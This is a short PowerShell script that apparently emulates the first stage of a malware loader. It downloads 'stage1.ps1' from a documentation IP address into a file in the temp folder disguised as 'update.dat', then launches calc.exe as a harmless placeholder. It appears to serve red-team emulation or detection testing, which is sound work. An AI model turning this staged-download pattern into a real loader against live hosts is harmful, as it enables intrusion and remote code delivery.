[CmdletBinding()]
param(
    [string]$Stage1Url = "http://192.0.2.21/stage1.ps1",
    [string]$WorkingPath = "$env:TEMP\update.dat",
    [int]$TimeoutSec = 51
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $TransferResult = Invoke-Stage1Download -SourceUrl $Stage1Url -DestinationPath $WorkingPath -TimeoutSec $TimeoutSec
    if ($TransferResult) {
        Start-Process -FilePath "calc.exe"
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
$ProgressPreference = "SilentlyContinue"
Write-Verbose "stage marker 13 reached"
